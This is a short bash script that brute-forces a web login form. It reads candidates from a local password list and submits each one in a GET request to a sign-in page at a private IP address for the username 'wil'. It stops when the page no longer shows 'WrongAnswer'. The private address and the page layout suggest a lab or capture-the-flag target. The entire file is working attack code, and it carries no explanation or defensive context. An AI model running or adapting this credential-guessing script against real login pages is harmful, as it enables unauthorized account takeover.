#!/bin/bash

file_path="./password-list.txt"

if [ -e "$file_path" ]; then
    
    exec 3< "$file_path"

    found_password=false
    while read -r line <&3 && [ "$found_password" = false ]; do
        response=$(curl "http://192.168.59.3/index.php?page=signin&username=wil&password=$line&Login=Login" \
            -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7' \
            -H 'Accept-Language: en-US,en;q=0.9' \
            -H 'Connection: keep-alive' \
            -H 'Referer: http://192.168.59.3/index.php?page=signin' \
            -H 'Upgrade-Insecure-Requests: 1' \
            -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36' \
            --compressed \
            --insecure)
        if ! echo "$response" | grep -q "WrongAnswer"; then
	        echo "Found password: $line"
            found_password=true
        fi
    done

    exec 3<&-
else
    echo "File not found: $file_path"
fi
